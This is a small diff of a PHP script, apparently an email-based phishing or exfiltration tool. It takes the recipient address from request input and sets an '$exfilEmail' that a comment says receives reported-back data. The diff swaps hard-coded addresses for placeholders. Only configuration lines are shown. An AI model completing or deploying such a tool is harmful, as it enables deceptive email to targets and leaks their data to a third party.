@@ -12,10 +12,10 @@ $sendIT = intval($_REQUEST['secretCODE']);
 $emailmessage = $_REQUEST['email'];
 
 //$targetEmail = person the Email will be sent to. $exfilEmail is the address that some data will be reported back to.
-//$targetEmail = "sethmeeup@gmail.com";
-//$targetEmail = "ids1044@rit.edu";
+//$targetEmail = "[email]";
+//$targetEmail = "[email]";
 $targetEmail = $emailmessage;
-$exfilEmail = "istroszeck@gmail.com";
+$exfilEmail = "[email]";
 
 
 // Sets Email Configuration
